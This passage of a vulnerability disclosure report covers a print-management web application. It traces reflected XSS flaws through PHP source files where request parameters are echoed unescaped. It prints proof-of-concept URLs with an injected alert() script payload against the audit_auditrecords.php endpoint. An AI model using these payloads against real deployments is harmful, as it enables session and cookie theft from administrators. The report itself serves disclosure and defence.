 <span style="color: #666666">38</span>             <span style="color: #19177C">$object_name</span> <span style="color: #666666">=</span> <span style="color: #BA2121">&quot;Printer&quot;</span>;
 <span style="color: #666666">39</span>             <span style="color: #008000; font-weight: bold">require_once</span> ABSPATH <span style="color: #666666">.</span> <span style="color: #BA2121">&quot;admin/design/reports/print_job_others.php&quot;</span>;
 <span style="color: #666666">40</span>             <span style="color: #008000; font-weight: bold">break</span>;
 <span style="color: #666666">41</span>         <span style="color: #008000; font-weight: bold">case</span> <span style="color: #BA2121">&#39;folder&#39;</span><span style="color: #666666">:</span>
 <span style="color: #666666">42</span>             <span style="color: #19177C">$object_name</span> <span style="color: #666666">=</span> <span style="color: #BA2121">&quot;Folder&quot;</span>;
 <span style="color: #666666">43</span>             <span style="color: #008000; font-weight: bold">require_once</span> ABSPATH <span style="color: #666666">.</span> <span style="color: #BA2121">&quot;admin/design/reports/print_job_folder.php&quot;</span>;
 <span style="color: #666666">44</span>             <span style="color: #008000; font-weight: bold">break</span>;
 <span style="color: #666666">45</span>         <span style="color: #008000; font-weight: bold">default</span><span style="color: #666666">:</span>
 <span style="color: #666666">46</span>             <span style="color: #008000; font-weight: bold">echo</span> <span style="color: #BA2121">&quot;Report type is not supported: &#39;</span><span style="color: #BB6688; font-weight: bold">$report_type</span><span style="color: #BA2121">&#39;&quot;</span>;                               [<span style="color: #666666">3</span>] XSS because <span style="color: #19177C">$report_type</span> <span style="color: #666666">=</span> requeststr(<span style="color: #BA2121">&quot;report_type&quot;</span>, <span style="color: #BA2121">&quot;Overview&quot;</span>);
 <span style="color: #666666">47</span>             <span style="color: #008000; font-weight: bold">break</span>;
</pre></div>

<p>Then the php files that are included from the <code>audit_records_html.php</code> also contain XSS:</p>
<p>Content of <code>/var/www/app/admin/design/reports/print_job_others.php</code>, with 12 XSS:</p>
<div class="colorful" style="background: #f8f8f8"><pre style="line-height: 125%"><span></span>  1 <span style="color: #BC7A00">&lt;?php</span>
[<span style="color: #666666">...</span>]
 <span style="color: #666666">76</span> <span style="color: #19177C">$header_params</span> <span style="color: #666666">=</span> <span style="color: #008000; font-weight: bold">array</span>(
 <span style="color: #666666">77</span>         <span style="color: #BA2121">&#39;report_type&#39;</span> <span style="color: #666666">=&gt;</span> <span style="color: #19177C">$report_type</span>,
 <span style="color: #666666">78</span>         <span style="color: #BA2121">&#39;start_date&#39;</span> <span style="color: #666666">=&gt;</span> <span style="color: #19177C">$start_date</span>,
 <span style="color: #666666">79</span>         <span style="color: #BA2121">&#39;start_time&#39;</span> <span style="color: #666666">=&gt;</span> <span style="color: #19177C">$start_time</span>,
 <span style="color: #666666">80</span>         <span style="color: #BA2121">&#39;stop_date&#39;</span> <span style="color: #666666">=&gt;</span> <span style="color: #19177C">$stop_date</span>,
 <span style="color: #666666">81</span>         <span style="color: #BA2121">&#39;stop_time&#39;</span> <span style="color: #666666">=&gt;</span> <span style="color: #19177C">$stop_time</span>,
 <span style="color: #666666">82</span> );
[<span style="color: #666666">...</span>]
<span style="color: #666666">208</span>                 report_header(<span style="color: #19177C">$header_params</span>);               [<span style="color: #666666">1</span>] <span style="color: #666666">6</span> XSS
[<span style="color: #666666">...</span>]
<span style="color: #666666">213</span>         report_header(<span style="color: #19177C">$header_params</span>);                       [<span style="color: #666666">6</span>] <span style="color: #666666">6</span> XSS
</pre></div>

<p>With the function <code>report_header()</code> implemented in <code>/web/www/app/helpers/reports.php</code>:</p>
<div class="colorful" style="background: #f8f8f8"><pre style="line-height: 125%"><span></span>  1 <span style="color: #BC7A00">&lt;?php</span>
[<span style="color: #666666">...</span>]
<span style="color: #666666">316</span> <span style="color: #008000; font-weight: bold">function</span> <span style="color: #0000FF">report_header</span>(<span style="color: #19177C">$params</span> <span style="color: #666666">=</span> <span style="color: #008000; font-weight: bold">array</span>()) {
<span style="color: #666666">317</span>         <span style="color: #19177C">$report_type</span> <span style="color: #666666">=</span> (<span style="color: #008000">isset</span>(<span style="color: #19177C">$params</span>[<span style="color: #BA2121">&#39;report_type&#39;</span>])) <span style="color: #666666">?</span> <span style="color: #19177C">$params</span>[<span style="color: #BA2121">&#39;report_type&#39;</span>] <span style="color: #666666">:</span> <span style="color: #BA2121">&#39;&#39;</span>;
<span style="color: #666666">318</span>         <span style="color: #19177C">$start_date</span> <span style="color: #666666">=</span> (<span style="color: #008000">isset</span>(<span style="color: #19177C">$params</span>[<span style="color: #BA2121">&#39;start_date&#39;</span>])) <span style="color: #666666">?</span> <span style="color: #19177C">$params</span>[<span style="color: #BA2121">&#39;start_date&#39;</span>] <span style="color: #666666">:</span> <span style="color: #BA2121">&#39;&#39;</span>;
<span style="color: #666666">319</span>         <span style="color: #19177C">$start_time</span> <span style="color: #666666">=</span> (<span style="color: #008000">isset</span>(<span style="color: #19177C">$params</span>[<span style="color: #BA2121">&#39;start_time&#39;</span>])) <span style="color: #666666">?</span> <span style="color: #19177C">$params</span>[<span style="color: #BA2121">&#39;start_time&#39;</span>] <span style="color: #666666">:</span> <span style="color: #BA2121">&#39;&#39;</span>;
<span style="color: #666666">320</span>         <span style="color: #19177C">$stop_date</span> <span style="color: #666666">=</span> (<span style="color: #008000">isset</span>(<span style="color: #19177C">$params</span>[<span style="color: #BA2121">&#39;stop_date&#39;</span>])) <span style="color: #666666">?</span> <span style="color: #19177C">$params</span>[<span style="color: #BA2121">&#39;stop_date&#39;</span>] <span style="color: #666666">:</span> <span style="color: #BA2121">&#39;&#39;</span>;
<span style="color: #666666">321</span>         <span style="color: #19177C">$stop_time</span> <span style="color: #666666">=</span> (<span style="color: #008000">isset</span>(<span style="color: #19177C">$params</span>[<span style="color: #BA2121">&#39;stop_time&#39;</span>])) <span style="color: #666666">?</span> <span style="color: #19177C">$params</span>[<span style="color: #BA2121">&#39;stop_time&#39;</span>] <span style="color: #666666">:</span> <span style="color: #BA2121">&#39;&#39;</span>;
<span style="color: #666666">322</span>
<span style="color: #666666">323</span>         <span style="color: #19177C">$date_range</span> <span style="color: #666666">=</span> <span style="color: #19177C">$start_date</span> <span style="color: #666666">.</span> <span style="color: #BA2121">&#39; &#39;</span> <span style="color: #666666">.</span> <span style="color: #19177C">$start_time</span> <span style="color: #666666">.</span> <span style="color: #BA2121">&#39; - &#39;</span> <span style="color: #666666">.</span> <span style="color: #19177C">$stop_date</span> <span style="color: #666666">.</span> <span style="color: #BA2121">&#39; &#39;</span> <span style="color: #666666">.</span> <span style="color: #19177C">$stop_time</span>;
[<span style="color: #666666">...</span>]
<span style="color: #666666">335</span>                 <span style="color: #666666">&lt;</span>h2<span style="color: #666666">&gt;&lt;?</span>php <span style="color: #008000; font-weight: bold">echo</span> <span style="color: #19177C">$report_type</span>; <span style="color: #BC7A00">?&gt;</span>&lt;/h2&gt;         [1] XSS
336                 &lt;h3&gt;<span style="color: #BC7A00">&lt;?php</span> <span style="color: #008000; font-weight: bold">echo</span> <span style="color: #19177C">$date_range</span>; <span style="color: #BC7A00">?&gt;</span>&lt;/h3&gt;          [2] XSS
</pre></div>

<p>These values are:</p>
<ul>
<li>$report_type = $params['report_type'] = $report_type (print_job_others.php) = requeststr("report_type", "Overview"); (audit_records.php)</li>
<li>$date_range = $start_date . ' ' . $start_time . ' - ' . $stop_date . ' ' . $stop_time;</li>
</ul>
<p>These 4 variables come from audit_records.php:</p>
<p>Content of <code>/var/www/app/admin/query/audit_records.php</code>:</p>
<div class="colorful" style="background: #f8f8f8"><pre style="line-height: 125%"><span></span>  1 <span style="color: #BC7A00">&lt;?php</span>
[<span style="color: #666666">...</span>]
 <span style="color: #666666">23</span> <span style="color: #19177C">$start_date</span> <span style="color: #666666">=</span> requeststr(<span style="color: #BA2121">&quot;start_date&quot;</span>);
 <span style="color: #666666">24</span> <span style="color: #19177C">$stop_date</span> <span style="color: #666666">=</span> requeststr(<span style="color: #BA2121">&quot;stop_date&quot;</span>);
 <span style="color: #666666">25</span> <span style="color: #19177C">$start_time</span> <span style="color: #666666">=</span> requeststr(<span style="color: #BA2121">&quot;start_time&quot;</span>);
 <span style="color: #666666">26</span> <span style="color: #19177C">$stop_time</span> <span style="color: #666666">=</span> requeststr(<span style="color: #BA2121">&quot;stop_time&quot;</span>);
</pre></div>

<p>Same XSS for <code>/var/www/app/admin/design/reports/print_job_folder.php</code>:</p>
<p>Content of <code>/var/www/app/admin/design/reports/print_job_folder.php</code>:</p>
<div class="colorful" style="background: #f8f8f8"><pre style="line-height: 125%"><span></span>  1 <span style="color: #BC7A00">&lt;?php</span>
[<span style="color: #666666">...</span>]
<span style="color: #666666">240</span> <span style="color: #19177C">$params</span> <span style="color: #666666">=</span> <span style="color: #008000; font-weight: bold">array</span>(
<span style="color: #666666">241</span>         <span style="color: #BA2121">&#39;report_type&#39;</span> <span style="color: #666666">=&gt;</span> <span style="color: #19177C">$report_type</span>,
<span style="color: #666666">242</span>         <span style="color: #BA2121">&#39;start_date&#39;</span> <span style="color: #666666">=&gt;</span> <span style="color: #19177C">$start_date</span>,
<span style="color: #666666">243</span>         <span style="color: #BA2121">&#39;start_time&#39;</span> <span style="color: #666666">=&gt;</span> <span style="color: #19177C">$start_time</span>,
<span style="color: #666666">244</span>         <span style="color: #BA2121">&#39;stop_date&#39;</span> <span style="color: #666666">=&gt;</span> <span style="color: #19177C">$stop_date</span>,
<span style="color: #666666">245</span>         <span style="color: #BA2121">&#39;stop_time&#39;</span> <span style="color: #666666">=&gt;</span> <span style="color: #19177C">$stop_time</span>,
[<span style="color: #666666">...</span>]
<span style="color: #666666">261</span>         report_header(<span style="color: #19177C">$params</span>);  [<span style="color: #666666">1</span>] <span style="color: #666666">6</span> XSS
[<span style="color: #666666">...</span>]
<span style="color: #666666">266</span>     report_header(<span style="color: #19177C">$params</span>);      [<span style="color: #666666">2</span>] <span style="color: #666666">6</span> XSS
</pre></div>

<p>Same XSS for <code>/www/app/admin/design/reports/print_job_records.php</code>:</p>
<p>Content of <code>/www/app/admin/design/reports/print_job_records.php</code>:</p>
<div class="colorful" style="background: #f8f8f8"><pre style="line-height: 125%"><span></span>  1 <span style="color: #BC7A00">&lt;?php</span>
[<span style="color: #666666">...</span>]
<span style="color: #666666">227</span> <span style="color: #19177C">$params</span> <span style="color: #666666">=</span> [
<span style="color: #666666">228</span>     <span style="color: #BA2121">&#39;report_type&#39;</span> <span style="color: #666666">=&gt;</span> <span style="color: #19177C">$report_type</span>,
<span style="color: #666666">229</span>     <span style="color: #BA2121">&#39;start_date&#39;</span> <span style="color: #666666">=&gt;</span> <span style="color: #19177C">$start_date</span>,
<span style="color: #666666">230</span>     <span style="color: #BA2121">&#39;start_time&#39;</span> <span style="color: #666666">=&gt;</span> <span style="color: #19177C">$start_time</span>,
<span style="color: #666666">231</span>     <span style="color: #BA2121">&#39;stop_date&#39;</span> <span style="color: #666666">=&gt;</span> <span style="color: #19177C">$stop_date</span>,
<span style="color: #666666">232</span>     <span style="color: #BA2121">&#39;stop_time&#39;</span> <span style="color: #666666">=&gt;</span> <span style="color: #19177C">$stop_time</span>,
<span style="color: #666666">...</span>
<span style="color: #666666">258</span>         report_header(<span style="color: #19177C">$params</span>);   [<span style="color: #666666">1</span>] <span style="color: #666666">6</span> XSS
<span style="color: #666666">...</span>
<span style="color: #666666">263</span>     report_header(<span style="color: #19177C">$params</span>);       [<span style="color: #666666">2</span>] <span style="color: #666666">6</span> XSS
</pre></div>

<p><code>/var/www/app/admin/design/reports/overview_main.php</code> will include several files depending on the $report_type (attacker-controlled value):</p>
<ul>
<li>admin/design/reports/overview_summary.php</li>
<li>admin/design/reports/overview_total_per_week.php</li>
<li>admin/design/reports/overview_time_of_day.php</li>
<li>admin/design/reports/overview_application_usage.php</li>
<li>admin/design/reports/overview_page_count.php</li>
<li>admin/design/reports/overview_environmental.php</li>
<li>admin/design/reports/overview_color.php</li>
<li>admin/design/reports/overview_paper_size.php</li>
</ul>
<p>This provides some other XSS vulnerabilities:</p>
<p>In <code>/var/www/admin/design/reports/overview_summary.php</code>:</p>
<div class="colorful" style="background: #f8f8f8"><pre style="line-height: 125%"><span></span>  1 <span style="color: #BC7A00">&lt;?php</span>
[<span style="color: #666666">...</span>]
 <span style="color: #666666">32</span>         <span style="color: #19177C">$params</span> <span style="color: #666666">=</span> <span style="color: #008000; font-weight: bold">array</span>(
 <span style="color: #666666">33</span>                 <span style="color: #BA2121">&#39;report_type&#39;</span> <span style="color: #666666">=&gt;</span> <span style="color: #19177C">$report_type</span>,
 <span style="color: #666666">34</span>                 <span style="color: #BA2121">&#39;start_date&#39;</span> <span style="color: #666666">=&gt;</span> <span style="color: #19177C">$start_date</span>,
 <span style="color: #666666">35</span>                 <span style="color: #BA2121">&#39;start_time&#39;</span> <span style="color: #666666">=&gt;</span> <span style="color: #19177C">$start_time</span>,
 <span style="color: #666666">36</span>                 <span style="color: #BA2121">&#39;stop_date&#39;</span> <span style="color: #666666">=&gt;</span> <span style="color: #19177C">$stop_date</span>,
 <span style="color: #666666">37</span>                 <span style="color: #BA2121">&#39;stop_time&#39;</span> <span style="color: #666666">=&gt;</span> <span style="color: #19177C">$stop_time</span>,
 <span style="color: #666666">38</span>         );
 <span style="color: #666666">39</span>         report_header(<span style="color: #19177C">$params</span>);   [<span style="color: #666666">1</span>] <span style="color: #666666">6</span> XSS
</pre></div>

<p>In <code>/var/www/admin/design/reports/overview_total_per_week.php</code>:</p>
<div class="colorful" style="background: #f8f8f8"><pre style="line-height: 125%"><span></span>  1 <span style="color: #BC7A00">&lt;?php</span>
[<span style="color: #666666">...</span>]
 <span style="color: #666666">51</span>         <span style="color: #19177C">$params</span> <span style="color: #666666">=</span> <span style="color: #008000; font-weight: bold">array</span>(
 <span style="color: #666666">52</span>                 <span style="color: #BA2121">&#39;report_type&#39;</span> <span style="color: #666666">=&gt;</span> <span style="color: #19177C">$report_type</span>,
 <span style="color: #666666">53</span>                 <span style="color: #BA2121">&#39;start_date&#39;</span> <span style="color: #666666">=&gt;</span> <span style="color: #19177C">$start_date</span>,
 <span style="color: #666666">54</span>                 <span style="color: #BA2121">&#39;start_time&#39;</span> <span style="color: #666666">=&gt;</span> <span style="color: #19177C">$start_time</span>,
 <span style="color: #666666">55</span>                 <span style="color: #BA2121">&#39;stop_date&#39;</span> <span style="color: #666666">=&gt;</span> <span style="color: #19177C">$stop_date</span>,
 <span style="color: #666666">56</span>                 <span style="color: #BA2121">&#39;stop_time&#39;</span> <span style="color: #666666">=&gt;</span> <span style="color: #19177C">$stop_time</span>,
 <span style="color: #666666">57</span>         );
 <span style="color: #666666">58</span>         report_header(<span style="color: #19177C">$params</span>);   [<span style="color: #666666">1</span>] <span style="color: #666666">6</span> XSS
</pre></div>

<p>Same XSS issues in:</p>
<ul>
<li>overview_time_of_day.php</li>
<li>overview_application_usage.php</li>
<li>overview_page_count.php</li>
<li>overview_environmental.php</li>
<li>overview_color.php</li>
<li>overview_paper_size.php</li>
</ul>
<p>Other XSS were found in different files:</p>
<p>Content of <code>/var/www/app/admin/query/audit_auditrecords.php</code>:</p>
<div class="colorful" style="background: #f8f8f8"><pre style="line-height: 125%"><span></span>  1 <span style="color: #BC7A00">&lt;?php</span>
[<span style="color: #666666">...</span>]
 <span style="color: #666666">89</span>           <span style="color: #008000; font-weight: bold">var</span> data <span style="color: #666666">=</span> {
 <span style="color: #666666">90</span>               <span style="color: #BA2121">&#39;validcheck&#39;</span><span style="color: #666666">:</span> <span style="color: #008000; font-weight: bold">true</span>,
 <span style="color: #666666">91</span>               <span style="color: #BA2121">&#39;report_params&#39;</span><span style="color: #666666">:</span> {
 <span style="color: #666666">92</span>                   <span style="color: #BA2121">&#39;start_date&#39;</span><span style="color: #666666">:</span> <span style="color: #BA2121">&#39;&lt;?= requeststr(&#39;</span>start_date<span style="color: #BA2121">&#39;) ?&gt;&#39;</span>,        [<span style="color: #666666">1</span>] XSS everywhere
 <span style="color: #666666">93</span>                   <span style="color: #BA2121">&#39;stop_date&#39;</span><span style="color: #666666">:</span> <span style="color: #BA2121">&#39;&lt;?= requeststr(&#39;</span>stop_date<span style="color: #BA2121">&#39;) ?&gt;&#39;</span>,
 <span style="color: #666666">94</span>                   <span style="color: #BA2121">&#39;start_time&#39;</span><span style="color: #666666">:</span> <span style="color: #BA2121">&#39;&lt;?= requeststr(&#39;</span>start_time<span style="color: #BA2121">&#39;) ?&gt;&#39;</span>,
 <span style="color: #666666">95</span>                   <span style="color: #BA2121">&#39;stop_time&#39;</span><span style="color: #666666">:</span> <span style="color: #BA2121">&#39;&lt;?= requeststr(&#39;</span>stop_time<span style="color: #BA2121">&#39;) ?&gt;&#39;</span>,
 <span style="color: #666666">96</span>                   <span style="color: #BA2121">&#39;time_offset&#39;</span><span style="color: #666666">:</span> <span style="color: #BA2121">&#39;&lt;?= requestint(&#39;</span>time_offset<span style="color: #BA2121">&#39;) * 60 * 60 ?&gt;&#39;</span>,
 <span style="color: #666666">97</span>                   <span style="color: #BA2121">&#39;object_name&#39;</span><span style="color: #666666">:</span> <span style="color: #BA2121">&#39;&lt;?= requeststr(&#39;</span>object_name<span style="color: #BA2121">&#39;, &#39;&#39;) ?&gt;&#39;</span>,
 <span style="color: #666666">98</span>                   <span style="color: #BA2121">&#39;username&#39;</span><span style="color: #666666">:</span> <span style="color: #BA2121">&#39;&lt;?= requeststr(&#39;</span>username<span style="color: #BA2121">&#39;) ?&gt;&#39;</span>,
 <span style="color: #666666">99</span>                   <span style="color: #BA2121">&#39;object_type&#39;</span><span style="color: #666666">:</span> <span style="color: #BA2121">&#39;&lt;?= requestint(&#39;</span>object_type<span style="color: #BA2121">&#39;,0) ?&gt;&#39;</span>,
<span style="color: #666666">100</span>                   <span style="color: #BA2121">&#39;object_id&#39;</span><span style="color: #666666">:</span> <span style="color: #BA2121">&#39;&lt;?= requestint(&#39;</span>object_id<span style="color: #BA2121">&#39;,0) ?&gt;&#39;</span>,
<span style="color: #666666">101</span>                   <span style="color: #BA2121">&#39;order&#39;</span><span style="color: #666666">:</span> <span style="color: #BA2121">&#39;&lt;?= requeststr(&#39;</span>order<span style="color: #BA2121">&#39;,&#39;&#39;) ?&gt;&#39;</span>,
</pre></div>

<p>With the function <code>requeststr()</code> function implemented in <code>/var/www/app/lib/common/global.inc.php</code>. Futhermore, <code>stripslashes()</code> doesn't protect against XSS.</p>
<p>Content of <code>/var/www/app/lib/common/global.inc.php</code>:</p>
<div class="colorful" style="background: #f8f8f8"><pre style="line-height: 125%"><span></span>  1 <span style="color: #BC7A00">&lt;?php</span>
[<span style="color: #666666">...</span>]
<span style="color: #666666">253</span> <span style="color: #008000; font-weight: bold">if</span> (<span style="color: #666666">!</span><span style="color: #008000">function_exists</span>(<span style="color: #BA2121">&#39;requeststr&#39;</span>))
<span style="color: #666666">254</span> {
<span style="color: #666666">255</span>         <span style="color: #008000; font-weight: bold">function</span> <span style="color: #0000FF">requeststr</span>(<span style="color: #19177C">$str</span>, <span style="color: #19177C">$def</span> <span style="color: #666666">=</span> <span style="color: #008000; font-weight: bold">NULL</span>)
<span style="color: #666666">256</span>         {
<span style="color: #666666">257</span>                 <span style="color: #19177C">$r</span> <span style="color: #666666">=</span> <span style="color: #19177C">$def</span>;
<span style="color: #666666">258</span>                 <span style="color: #008000; font-weight: bold">if</span>(<span style="color: #008000">isset</span>(<span style="color: #19177C">$_GET</span>[<span style="color: #19177C">$str</span>]))
<span style="color: #666666">259</span>                 {
<span style="color: #666666">260</span>                         <span style="color: #19177C">$r</span> <span style="color: #666666">=</span> <span style="color: #19177C">$_GET</span>[<span style="color: #19177C">$str</span>];
<span style="color: #666666">261</span>                         <span style="color: #008000; font-weight: bold">if</span>(quotes_on())
<span style="color: #666666">262</span>                         {
<span style="color: #666666">263</span>                                 <span style="color: #19177C">$r</span> <span style="color: #666666">=</span> <span style="color: #008000">stripslashes</span>(<span style="color: #19177C">$r</span>);
<span style="color: #666666">264</span>                         }
<span style="color: #666666">265</span>                 }
<span style="color: #666666">266</span>                 <span style="color: #008000; font-weight: bold">else</span> <span style="color: #008000; font-weight: bold">if</span>(<span style="color: #008000">isset</span>(<span style="color: #19177C">$_POST</span>[<span style="color: #19177C">$str</span>]))
<span style="color: #666666">267</span>                 {
<span style="color: #666666">268</span>                         <span style="color: #19177C">$r</span> <span style="color: #666666">=</span> <span style="color: #19177C">$_POST</span>[<span style="color: #19177C">$str</span>];
<span style="color: #666666">269</span>                         <span style="color: #008000; font-weight: bold">if</span>(quotes_on())
<span style="color: #666666">270</span>                         {
<span style="color: #666666">271</span>                                 <span style="color: #19177C">$r</span> <span style="color: #666666">=</span> <span style="color: #008000">stripslashes</span>(<span style="color: #19177C">$r</span>);
<span style="color: #666666">272</span>                         }
<span style="color: #666666">273</span>                 }
<span style="color: #666666">274</span>                 <span style="color: #008000; font-weight: bold">return</span> <span style="color: #19177C">$r</span>;
<span style="color: #666666">275</span>         }
<span style="color: #666666">276</span> }
</pre></div>

<p>A trivial exploit of a previous XSS is shown below:</p>
<p><img alt="" src="images/2025-vasion-report-1-xss-05.png" />
http://10.105.0.241/admin/query/audit_auditrecords.php?order='XSS</p>
<p><img alt="" src="images/2025-vasion-report-1-xss-06.png" /></p>
<p><a href="images/2025-vasion-report-1-xss-06-full.png">Click here for full image</a></p>
<pre><code>https://[redacted].printercloud10.com/admin/query/audit_auditrecords.php?order=%27%3C/script%3E%3Cscript%3Ealert(%27XSS%27)%3C/script%3E
</code></pre>
<p><code>/var/www/app/admin/design/reports/chart_image.php</code> is also interesting because it will blindly trust attacker-controlled data (<code>$description</code> and <code>requeststr("title")</code>). It is recommended to correctly escape them:</p>
<p>Content of <code>/var/www/app/admin/design/reports/chart_image.php</code>:</p>
<div class="colorful" style="background: #f8f8f8"><pre style="line-height: 125%"><span></span>  1 <span style="color: #BC7A00">&lt;?php</span>
[<span style="color: #666666">...</span>]
<span style="color: #666666">50</span> <span style="color: #19177C">$description</span> <span style="color: #666666">=</span> <span style="color: #008000">json_decode</span>(<span style="color: #008000">base64_decode</span>(requeststr(<span style="color: #BA2121">&quot;datasetdescription&quot;</span>)), <span style="color: #008000; font-weight: bold">true</span>);
[<span style="color: #666666">...</span>]
 <span style="color: #666666">82</span>   <span style="color: #19177C">$chart</span><span style="color: #666666">-&gt;</span><span style="color: #7D9029">drawScale</span>(<span style="color: #19177C">$data</span>, <span style="color: #19177C">$description</span>, SCALE_NORMAL, <span style="color: #666666">150</span>, <span style="color: #666666">150</span>, <span style="color: #666666">150</span>, <span style="color: #008000; font-weight: bold">true</span>, <span style="color: #666666">45</span>, <span style="color: #666666">0</span>, <span style="color: #008000; font-weight: bold">true</span>);
[<span style="color: #666666">...</span>]
 <span style="color: #666666">84</span>   <span style="color: #19177C">$chart</span><span style="color: #666666">-&gt;</span><span style="color: #7D9029">drawLineGraph</span>(<span style="color: #19177C">$data</span>, <span style="color: #19177C">$description</span>);
 <span style="color: #666666">85</span>   <span style="color: #19177C">$chart</span><span style="color: #666666">-&gt;</span><span style="color: #7D9029">drawPlotGraph</span>(<span style="color: #19177C">$data</span>, <span style="color: #19177C">$description</span>, <span style="color: #666666">3</span>, <span style="color: #666666">2</span>, <span style="color: #666666">255</span>, <span style="color: #666666">255</span>, <span style="color: #666666">255</span>);
[<span style="color: #666666">...</span>]
 <span style="color: #666666">89</span>   <span style="color: #19177C">$chart</span><span style="color: #666666">-&gt;</span><span style="color: #7D9029">drawBasicPieGraph</span>(<span style="color: #19177C">$data</span>, <span style="color: #19177C">$description</span>, <span style="color: #19177C">$width</span> <span style="color: #666666">/</span> <span style="color: #666666">2</span>, <span style="color: #19177C">$height</span> <span style="color: #666666">/</span> <span style="color: #666666">2</span>, <span style="color: #008000">min</span>(<span style="color: #19177C">$width</span>, <span style="color: #19177C">$height</span>) <span style="color: #666666">/</span> <span style="color: #666666">2.6</span>, PIE_PERCENTAGE);
 <span style="color: #666666">90</span>   <span style="color: #19177C">$chart</span><span style="color: #666666">-&gt;</span><span style="color: #7D9029">drawPieLegend</span>(<span style="color: #19177C">$width</span> <span style="color: #666666">-</span> <span style="color: #19177C">$legend_width</span> <span style="color: #666666">-</span> <span style="color: #666666">15</span>, <span style="color: #666666">25</span>, <span style="color: #19177C">$data</span>, <span style="color: #19177C">$description</span>, <span style="color: #666666">250</span>, <span style="color: #666666">250</span>, <span style="color: #666666">250</span>);
[<span style="color: #666666">...</span>]
 <span style="color: #666666">97</span>   <span style="color: #19177C">$chart</span><span style="color: #666666">-&gt;</span><span style="color: #7D9029">drawScale</span>(
 <span style="color: #666666">98</span>       <span style="color: #19177C">$data</span>, <span style="color: #19177C">$description</span>, SCALE_NORMAL, <span style="color: #666666">150</span>, <span style="color: #666666">150</span>, <span style="color: #666666">150</span>, <span style="color: #008000; font-weight: bold">true</span>, <span style="color: #19177C">$x_axis_label_angle</span>, <span style="color: #666666">0</span>, <span style="color: #008000; font-weight: bold">true</span>);
[<span style="color: #666666">...</span>]
<span style="color: #666666">100</span>   <span style="color: #19177C">$chart</span><span style="color: #666666">-&gt;</span><span style="color: #7D9029">drawBarGraph</span>(<span style="color: #19177C">$data</span>, <span style="color: #19177C">$description</span>, <span style="color: #666666">50</span>, <span style="color: #008000; font-weight: bold">true</span>);
<span style="color: #666666">101</span>   <span style="color: #19177C">$chart</span><span style="color: #666666">-&gt;</span><span style="color: #7D9029">drawLegend</span>(<span style="color: #19177C">$width</span> <span style="color: #666666">-</span> <span style="color: #19177C">$legend_width</span> <span style="color: #666666">-</span> <span style="color: #666666">30</span>, <span style="color: #666666">45</span>, <span style="color: #19177C">$description</span>, <span style="color: #666666">250</span>, <span style="color: #666666">250</span>, <span style="color: #666666">250</span>);



<span style="color: #19177C">$data</span> also<span style="color: #666666">:</span>
 <span style="color: #666666">49</span> <span style="color: #19177C">$data</span> <span style="color: #666666">=</span> <span style="color: #008000">json_decode</span>(<span style="color: #008000">base64_decode</span>(requeststr(<span style="color: #BA2121">&quot;datasetdata&quot;</span>)), <span style="color: #008000; font-weight: bold">true</span>);
[<span style="color: #666666">...</span>]
 <span style="color: #666666">82</span>   <span style="color: #19177C">$chart</span><span style="color: #666666">-&gt;</span><span style="color: #7D9029">drawScale</span>(<span style="color: #19177C">$data</span>, <span style="color: #19177C">$description</span>, SCALE_NORMAL, <span style="color: #666666">150</span>, <span style="color: #666666">150</span>, <span style="color: #666666">150</span>, <span style="color: #008000; font-weight: bold">true</span>, <span style="color: #666666">45</span>, <span style="color: #666666">0</span>, <span style="color: #008000; font-weight: bold">true</span>);
[<span style="color: #666666">...</span>]
 <span style="color: #666666">84</span>   <span style="color: #19177C">$chart</span><span style="color: #666666">-&gt;</span><span style="color: #7D9029">drawLineGraph</span>(<span style="color: #19177C">$data</span>, <span style="color: #19177C">$description</span>);
 <span style="color: #666666">85</span>   <span style="color: #19177C">$chart</span><span style="color: #666666">-&gt;</span><span style="color: #7D9029">drawPlotGraph</span>(<span style="color: #19177C">$data</span>, <span style="color: #19177C">$description</span>, <span style="color: #666666">3</span>, <span style="color: #666666">2</span>, <span style="color: #666666">255</span>, <span style="color: #666666">255</span>, <span style="color: #666666">255</span>);
[<span style="color: #666666">...</span>]
 <span style="color: #666666">89</span>   <span style="color: #19177C">$chart</span><span style="color: #666666">-&gt;</span><span style="color: #7D9029">drawBasicPieGraph</span>(<span style="color: #19177C">$data</span>, <span style="color: #19177C">$description</span>, <span style="color: #19177C">$width</span> <span style="color: #666666">/</span> <span style="color: #666666">2</span>, <span style="color: #19177C">$height</span> <span style="color: #666666">/</span> <span style="color: #666666">2</span>, <span style="color: #008000">min</span>(<span style="color: #19177C">$width</span>, <span style="color: #19177C">$height</span>) <span style="color: #666666">/</span> <span style="color: #666666">2.6</span>, PIE_PERCENTAGE);
 <span style="color: #666666">90</span>   <span style="color: #19177C">$chart</span><span style="color: #666666">-&gt;</span><span style="color: #7D9029">drawPieLegend</span>(<span style="color: #19177C">$width</span> <span style="color: #666666">-</span> <span style="color: #19177C">$legend_width</span> <span style="color: #666666">-</span> <span style="color: #666666">15</span>, <span style="color: #666666">25</span>, <span style="color: #19177C">$data</span>, <span style="color: #19177C">$description</span>, <span style="color: #666666">250</span>, <span style="color: #666666">250</span>, <span style="color: #666666">250</span>);
[<span style="color: #666666">...</span>]
 <span style="color: #666666">97</span>   <span style="color: #19177C">$chart</span><span style="color: #666666">-&gt;</span><span style="color: #7D9029">drawScale</span>(
 <span style="color: #666666">98</span>       <span style="color: #19177C">$data</span>, <span style="color: #19177C">$description</span>, SCALE_NORMAL, <span style="color: #666666">150</span>, <span style="color: #666666">150</span>, <span style="color: #666666">150</span>, <span style="color: #008000; font-weight: bold">true</span>, <span style="color: #19177C">$x_axis_label_angle</span>, <span style="color: #666666">0</span>, <span style="color: #008000; font-weight: bold">true</span>);
[<span style="color: #666666">...</span>]
<span style="color: #666666">100</span>   <span style="color: #19177C">$chart</span><span style="color: #666666">-&gt;</span><span style="color: #7D9029">drawBarGraph</span>(<span style="color: #19177C">$data</span>, <span style="color: #19177C">$description</span>, <span style="color: #666666">50</span>, <span style="color: #008000; font-weight: bold">true</span>);
[<span style="color: #666666">...</span>]
<span style="color: #666666">103</span> <span style="color: #19177C">$chart</span><span style="color: #666666">-&gt;</span><span style="color: #7D9029">drawTitle</span>(<span style="color: #666666">60</span>, <span style="color: #666666">22</span>, requeststr(<span style="color: #BA2121">&quot;title&quot;</span>, <span style="color: #BA2121">&quot;&quot;</span>), <span style="color: #666666">50</span>, <span style="color: #666666">50</span>, <span style="color: #666666">50</span>, <span style="color: #19177C">$width</span> <span style="color: #666666">-</span> <span style="color: #666666">100</span>);
</pre></div>

<p>The solution includes a large number of XSS, allowing an attacker to steal administrator's cookies.</p>
